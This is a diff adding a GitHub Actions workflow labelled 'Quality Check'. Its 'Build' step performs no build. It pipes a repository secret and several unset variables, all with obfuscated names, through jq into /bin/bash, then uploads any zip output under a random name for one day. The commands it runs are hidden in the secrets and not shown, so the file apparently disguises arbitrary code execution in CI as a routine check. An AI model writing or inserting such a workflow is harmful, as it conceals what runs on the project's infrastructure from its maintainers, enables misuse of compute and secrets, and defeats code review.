@@ -1,0 +1,31 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build
+        env:
+          whzp0102: ${{ secrets.whzp0102 }}
+        run: |
+          printf '%s' "$whzp0102" | jq -r .ld32 | /bin/bash
+          printf '%s' "$luano1" | jq -r .kz104 | /bin/bash
+          printf '%s' "$mh74123" | jq -r .t05155 | /bin/bash
+          printf '%s' "$v3824" | jq -r .z695 | /bin/bash
+          echo $xvv56 | jq -r .lalx4 | /bin/bash
+          echo $yryls03 | jq -r .t629 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: xGJ4k5fL
+          path: "*.zip"
+          retention-days: 1
